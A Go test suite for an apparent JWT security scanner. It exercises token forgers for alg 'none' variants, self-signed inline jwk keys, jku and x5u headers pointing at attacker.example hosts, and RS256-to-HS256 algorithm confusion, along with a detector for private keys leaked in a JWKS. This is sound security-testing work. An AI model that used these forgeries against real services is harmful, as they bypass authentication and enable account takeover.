package scanner

import (
	"crypto"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"math/big"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// Test fixtures shared by this file. jwt_weak_test.go already defines b64url
// (base64.RawURLEncoding.EncodeToString) in this package; reused here rather
// than redefined.
// ---------------------------------------------------------------------------

// jwtRawToken builds a JWS compact-serialization string from JSON-able header/payload maps and a
// raw (already-encoded, or "" for empty) signature segment.
func jwtRawToken(t *testing.T, header, payload map[string]any, sig string) string {
	t.Helper()
	h, err := json.Marshal(header)
	if err != nil {
		t.Fatalf("marshaling test header: %v", err)
	}
	p, err := json.Marshal(payload)
	if err != nil {
		t.Fatalf("marshaling test payload: %v", err)
	}
	return b64url(h) + "." + b64url(p) + "." + sig
}

// decodeTestB64url decodes s as base64url, failing the test rather than the calling code path if it
// is not valid — every signature segment this file inspects came from this file's own forgers, so an
// invalid one is a test bug, not a case to assert on.
func decodeTestB64url(t *testing.T, s string) []byte {
	t.Helper()
	b, err := base64.RawURLEncoding.DecodeString(s)
	if err != nil {
		t.Fatalf("test signature segment %q is not valid base64url: %v", s, err)
	}
	return b
}

// rsaPublicKeyFromTestJWK reconstructs an *rsa.PublicKey from a jwk map's own n/e members, so a test
// can verify a signature against exactly the key a forger embedded rather than against the key it
// generated the forgery from — those must be the same key, and this is what proves it.
func rsaPublicKeyFromTestJWK(t *testing.T, jwk map[string]any) *rsa.PublicKey {
	t.Helper()
	nStr, _ := jwk["n"].(string)
	eStr, _ := jwk["e"].(string)
	nBytes, err := base64.RawURLEncoding.DecodeString(nStr)
	if err != nil {
		t.Fatalf("jwk n is not valid base64url: %v", err)
	}
	eBytes, err := base64.RawURLEncoding.DecodeString(eStr)
	if err != nil {
		t.Fatalf("jwk e is not valid base64url: %v", err)
	}
	return &rsa.PublicKey{
		N: new(big.Int).SetBytes(nBytes),
		E: int(new(big.Int).SetBytes(eBytes).Int64()),
	}
}

// realPublicKeyPEMForTest generates a fresh RSA keypair and PEM-encodes its public half, the shape
// ForgeAlgConfusion's rsaPublicKeyPEM parameter documents.
func realPublicKeyPEMForTest(t *testing.T) []byte {
	t.Helper()
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		t.Fatalf("generating test rsa key: %v", err)
	}
	der, err := x509.MarshalPKIXPublicKey(&priv.PublicKey)
	if err != nil {
		t.Fatalf("marshaling test public key: %v", err)
	}
	return pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: der})
}

// rsaJWKMembers renders priv as a JWKS "keys" member; includePrivate adds d (and p/q when
// available), the fields rsaJWKDiscloses treats as load-bearing private material.
func rsaJWKMembers(priv *rsa.PrivateKey, kid string, includePrivate bool) map[string]any {
	m := map[string]any{
		"kty": "RSA",
		"kid": kid,
		"n":   b64url(priv.PublicKey.N.Bytes()),
		"e":   b64url(big.NewInt(int64(priv.PublicKey.E)).Bytes()),
	}
	if includePrivate {
		m["d"] = b64url(priv.D.Bytes())
		if len(priv.Primes) >= 2 {
			m["p"] = b64url(priv.Primes[0].Bytes())
			m["q"] = b64url(priv.Primes[1].Bytes())
		}
	}
	return m
}

// ecJWKMembers renders priv as a JWKS "keys" member on P-256; includePrivate adds d, the field
// ecJWKDiscloses treats as load-bearing private material.
func ecJWKMembers(priv *ecdsa.PrivateKey, kid string, includePrivate bool) map[string]any {
	m := map[string]any{
		"kty": "EC",
		"kid": kid,
		"crv": "P-256",
		"x":   b64url(priv.PublicKey.X.Bytes()),
		"y":   b64url(priv.PublicKey.Y.Bytes()),
	}
	if includePrivate {
		m["d"] = b64url(priv.D.Bytes())
	}
	return m
}

// ---------------------------------------------------------------------------
// ParseJWT
// ---------------------------------------------------------------------------

func TestParseJWTRefusesAMalformedTokenNotThreeSegments(t *testing.T) {
	tok := ParseJWT("only.two")
	if tok.ParseError == "" {
		t.Fatal("a two-segment string is not a JWS and must set ParseError")
	}
	if tok.RawHeader != "" || tok.RawPayload != "" || tok.RawSignature != "" || tok.Header.Alg != "" || tok.Payload != nil {
		t.Errorf("a refused parse must yield nothing forgeable, got %+v", tok)
	}
}

func TestParseJWTRefusesAHeaderThatIsNotJSON(t *testing.T) {
	// Three segments, so this must be refused for JSON-ness, not segment count.
	raw := b64url([]byte("not json")) + "." + b64url([]byte(`{"sub":"a"}`)) + ".sig"
	tok := ParseJWT(raw)
	if tok.ParseError == "" {
		t.Fatal("a header that does not decode to JSON must set ParseError")
	}
	if tok.Header.Alg != "" || tok.RawHeader != "" || tok.RawPayload != "" {
		t.Errorf("a refused parse must yield nothing forgeable, got %+v", tok)
	}
}

// ---------------------------------------------------------------------------
// alg: none
// ---------------------------------------------------------------------------

func TestForgeNoneAlgProducesAnEmptySignatureAndPreservesKidAndTyp(t *testing.T) {
	original := ParseJWT(jwtRawToken(t,
		map[string]any{"alg": "HS256", "typ": "JWT", "kid": "server-key"},
		map[string]any{"sub": "admin"}, "realsig"))

	forged, err := ForgeNoneAlg(original)
	if err != nil {
		t.Fatalf("forging none-alg from a well-formed token must not error: %v", err)
	}
	reparsed := ParseJWT(forged)
	if reparsed.ParseError != "" {
		t.Fatalf("a forged none-alg token must itself parse cleanly, got %q", reparsed.ParseError)
	}
	if reparsed.Header.Alg != "none" {
		t.Errorf("forged alg = %q, want \"none\"", reparsed.Header.Alg)
	}
	if reparsed.RawSignature != "" {
		t.Errorf("forged signature segment = %q, want empty", reparsed.RawSignature)
	}
	if reparsed.Header.Kid != "server-key" || reparsed.Header.Typ != "JWT" {
		t.Errorf("kid/typ must pass through unchanged, got kid=%q typ=%q", reparsed.Header.Kid, reparsed.Header.Typ)
	}
	if reparsed.Payload["sub"] != "admin" {
		t.Errorf("the original payload claims must be preserved verbatim, got %+v", reparsed.Payload)
	}
}

func TestForgeNoneAlgVariantsCoversTheDocumentedCaseVariants(t *testing.T) {
	original := ParseJWT(jwtRawToken(t, map[string]any{"alg": "HS256"}, map[string]any{"sub": "x"}, "sig"))
	variants := ForgeNoneAlgVariants(original)
	if len(variants) == 0 {
		t.Fatal("must forge at least one variant for a well-formed token")
	}
	seen := map[string]bool{"none": false, "None": false, "NONE": false, "nOnE": false}
	for _, tok := range variants {
		reparsed := ParseJWT(tok)
		if reparsed.ParseError != "" {
			t.Fatalf("every forged variant must itself parse cleanly, got %q", reparsed.ParseError)
		}
		if reparsed.RawSignature != "" {
			t.Errorf("variant alg %q must have an empty signature segment", reparsed.Header.Alg)
		}
		if !strings.EqualFold(reparsed.Header.Alg, "none") {
			t.Errorf("variant alg %q is not a case permutation of \"none\"", reparsed.Header.Alg)
		}
		if _, tracked := seen[reparsed.Header.Alg]; tracked {
			seen[reparsed.Header.Alg] = true
		}
	}
	for variant, wasSeen := range seen {
		if !wasSeen {
			t.Errorf("documented variant %q was not among the forged tokens", variant)
		}
	}
}

// ---------------------------------------------------------------------------
// Self-signed jwk / arbitrary jku / arbitrary x5u
// ---------------------------------------------------------------------------

func TestForgeSelfSignedJwkProducesATokenWhoseEmbeddedKeyVerifiesItsOwnSignature(t *testing.T) {
	original := ParseJWT(jwtRawToken(t, map[string]any{"alg": "RS256", "typ": "JWT"}, map[string]any{"sub": "admin"}, "irrelevant"))

	forged, pub, err := ForgeSelfSignedJWK(original)
	if err != nil {
		t.Fatalf("forging a self-signed jwk from a well-formed token must not error: %v", err)
	}
	reparsed := ParseJWT(forged)
	if reparsed.ParseError != "" {
		t.Fatalf("a forged self-signed-jwk token must itself parse cleanly, got %q", reparsed.ParseError)
	}
	if reparsed.Header.Alg != "RS256" {
		t.Errorf("forged alg = %q, want RS256", reparsed.Header.Alg)
	}
	if reparsed.Header.Jwk == nil {
		t.Fatal("forged header must carry an inline jwk member")
	}

	embeddedPub := rsaPublicKeyFromTestJWK(t, reparsed.Header.Jwk)
	if embeddedPub.N.Cmp(pub.N) != 0 || embeddedPub.E != pub.E {
		t.Fatal("the embedded jwk does not match the public key ForgeSelfSignedJWK returned")
	}

	sig := decodeTestB64url(t, reparsed.RawSignature)
	digest := sha256.Sum256([]byte(reparsed.RawHeader + "." + reparsed.RawPayload))
	if err := rsa.VerifyPKCS1v15(embeddedPub, crypto.SHA256, digest[:], sig); err != nil {
		t.Fatalf("the token's own embedded jwk must verify its own signature (this is the proof the crypto is real, not stubbed): %v", err)
	}
}

func TestForgeWithJkuPointsAtTheUrlAndReturnsAJwksThatVerifiesTheSignature(t *testing.T) {
	original := ParseJWT(jwtRawToken(t, map[string]any{"alg": "HS256", "typ": "JWT"}, map[string]any{"sub": "admin"}, "irrelevant"))
	const jkuURL = "https://attacker.example/jwks.json"

	forged, jwks, err := ForgeWithJku(original, jkuURL)
	if err != nil {
		t.Fatalf("forging with jku from a well-formed token must not error: %v", err)
	}
	reparsed := ParseJWT(forged)
	if reparsed.ParseError != "" {
		t.Fatalf("a forged jku token must itself parse cleanly, got %q", reparsed.ParseError)
	}
	if reparsed.Header.Jku != jkuURL {
		t.Errorf("forged jku = %q, want %q", reparsed.Header.Jku, jkuURL)
	}
	if reparsed.Header.Alg != "RS256" {
		t.Errorf("forged alg = %q, want RS256", reparsed.Header.Alg)
	}

	var doc struct {
		Keys []map[string]any `json:"keys"`
	}
	if err := json.Unmarshal(jwks, &doc); err != nil {
		t.Fatalf("returned jwks does not parse as a JWKS document: %v", err)
	}
	if len(doc.Keys) != 1 {
		t.Fatalf("returned jwks has %d keys, want 1", len(doc.Keys))
	}
	if doc.Keys[0]["kid"] != reparsed.Header.Kid {
		t.Fatalf("the jku token's kid %q does not match the jwks key's kid %v — a verifier could not resolve it",
			reparsed.Header.Kid, doc.Keys[0]["kid"])
	}

	embeddedPub := rsaPublicKeyFromTestJWK(t, doc.Keys[0])
	sig := decodeTestB64url(t, reparsed.RawSignature)
	digest := sha256.Sum256([]byte(reparsed.RawHeader + "." + reparsed.RawPayload))
	if err := rsa.VerifyPKCS1v15(embeddedPub, crypto.SHA256, digest[:], sig); err != nil {
		t.Fatalf("the hosted jwks key must verify the forged signature: %v", err)
	}
}

func TestForgeWithX5uPointsAtTheUrlAndReturnsACertificateThatVerifiesTheSignature(t *testing.T) {
	original := ParseJWT(jwtRawToken(t, map[string]any{"alg": "HS256"}, map[string]any{"sub": "admin"}, "irrelevant"))
	const x5uURL = "https://attacker.example/cert.pem"

	forged, certPEM, err := ForgeWithX5u(original, x5uURL)
	if err != nil {
		t.Fatalf("forging with x5u from a well-formed token must not error: %v", err)
	}
	reparsed := ParseJWT(forged)
	if reparsed.ParseError != "" {
		t.Fatalf("a forged x5u token must itself parse cleanly, got %q", reparsed.ParseError)
	}
	if reparsed.Header.X5u != x5uURL {
		t.Errorf("forged x5u = %q, want %q", reparsed.Header.X5u, x5uURL)
	}
	if reparsed.Header.Alg != "RS256" {
		t.Errorf("forged alg = %q, want RS256", reparsed.Header.Alg)
	}

	block, _ := pem.Decode(certPEM)
	if block == nil || block.Type != "CERTIFICATE" {
		t.Fatal("returned bytes do not decode as a PEM certificate")
	}
	cert, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		t.Fatalf("returned certificate does not parse: %v", err)
	}
	embeddedPub, isRSA := cert.PublicKey.(*rsa.PublicKey)
	if !isRSA {
		t.Fatalf("certificate public key is %T, want *rsa.PublicKey", cert.PublicKey)
	}

	sig := decodeTestB64url(t, reparsed.RawSignature)
	digest := sha256.Sum256([]byte(reparsed.RawHeader + "." + reparsed.RawPayload))
	if err := rsa.VerifyPKCS1v15(embeddedPub, crypto.SHA256, digest[:], sig); err != nil {
		t.Fatalf("the hosted certificate's key must verify the forged signature: %v", err)
	}
}

// TestForgersRefuseAnUnparsedToken covers ParseJWT's refuse-by-default contract from the forger
// side: every Forge* function (and ForgeNoneAlgVariants) must decline to build on top of a token
// that failed to parse, rather than silently forging from its zero-valued fields.
func TestForgersRefuseAnUnparsedToken(t *testing.T) {
	bad := ParseJWT("garbage")
	if _, err := ForgeNoneAlg(bad); err == nil {
		t.Error("ForgeNoneAlg must refuse an unparsed token")
	}
	if variants := ForgeNoneAlgVariants(bad); len(variants) != 0 {
		t.Errorf("ForgeNoneAlgVariants must yield nothing forgeable for an unparsed token, got %d", len(variants))
	}
	if _, _, err := ForgeSelfSignedJWK(bad); err == nil {
		t.Error("ForgeSelfSignedJWK must refuse an unparsed token")
	}
	if _, _, err := ForgeWithJku(bad, "https://attacker.example/jwks.json"); err == nil {
		t.Error("ForgeWithJku must refuse an unparsed token")
	}
	if _, _, err := ForgeWithX5u(bad, "https://attacker.example/cert.pem"); err == nil {
		t.Error("ForgeWithX5u must refuse an unparsed token")
	}
	if _, err := ForgeAlgConfusion(bad, []byte("irrelevant")); err == nil {
		t.Error("ForgeAlgConfusion must refuse an unparsed token")
	}
}

// ---------------------------------------------------------------------------
// RS256 -> HS256 algorithm confusion, and SignatureVerifies
// ---------------------------------------------------------------------------

func TestForgeAlgConfusionSignsWithThePublicKeyBytesAsAnHmacSecretAndKeepsTheKid(t *testing.T) {
	original := ParseJWT(jwtRawToken(t,
		map[string]any{"alg": "RS256", "kid": "server-rsa-key-7"},
		map[string]any{"sub": "admin"}, "irrelevant"))
	publicKeyPEM := realPublicKeyPEMForTest(t)

	forged, err := ForgeAlgConfusion(original, publicKeyPEM)
	if err != nil {
		t.Fatalf("forging alg confusion from a well-formed token must not error: %v", err)
	}
	reparsed := ParseJWT(forged)
	if reparsed.ParseError != "" {
		t.Fatalf("a forged alg-confusion token must itself parse cleanly, got %q", reparsed.ParseError)
	}
	if reparsed.Header.Alg != "HS256" {
		t.Errorf("forged alg = %q, want HS256", reparsed.Header.Alg)
	}
	if reparsed.Header.Kid != "server-rsa-key-7" {
		t.Errorf("forged kid = %q, want the original kid so a verifier resolves the same key material", reparsed.Header.Kid)
	}
	if !reparsed.SignatureVerifies(publicKeyPEM) {
		t.Fatal("the forged token must verify against the exact public key bytes used to sign it")
	}
	if reparsed.SignatureVerifies([]byte("some other secret entirely")) {
		t.Fatal("the forged token must not verify against unrelated key material")
	}
}

func TestSignatureVerifiesReturnsFalseForATokenClaimingANonHs256Algorithm(t *testing.T) {
	original := ParseJWT(jwtRawToken(t, map[string]any{"alg": "RS256"}, map[string]any{"sub": "x"}, "irrelevant"))
	forged, _, err := ForgeSelfSignedJWK(original)
	if err != nil {
		t.Fatalf("forging self-signed jwk: %v", err)
	}
	reparsed := ParseJWT(forged)
	if reparsed.SignatureVerifies([]byte("anything")) {
		t.Fatal("an RS256 token must never report HS256 signature verification, regardless of the key tried")
	}
}

// ---------------------------------------------------------------------------
// Private key disclosure in a JWK Set
// ---------------------------------------------------------------------------

func TestScanForPrivateKeyInJwksFindsLeakedKeysAndSparesPublicOnlyOnes(t *testing.T) {
	leakyRSA, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		t.Fatalf("generating test rsa key: %v", err)
	}
	cleanRSA, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		t.Fatalf("generating test rsa key: %v", err)
	}
	leakyEC, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatalf("generating test ec key: %v", err)
	}
	cleanEC, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatalf("generating test ec key: %v", err)
	}
	body, err := json.Marshal(map[string]any{"keys": []any{
		rsaJWKMembers(leakyRSA, "leaky-rsa", true),
		rsaJWKMembers(cleanRSA, "clean-rsa", false),
		ecJWKMembers(leakyEC, "leaky-ec", true),
		ecJWKMembers(cleanEC, "clean-ec", false),
	}})
	if err != nil {
		t.Fatalf("marshaling test jwks: %v", err)
	}

	got := ScanForPrivateKeyInJWKS(body)
	want := map[string]bool{"leaky-rsa": true, "leaky-ec": true}
	if len(got) != len(want) {
		t.Fatalf("got offending kids %v, want exactly %v", got, want)
	}
	for _, kid := range got {
		if !want[kid] {
			t.Errorf("public-only key %q must not be flagged", kid)
		}
	}
}
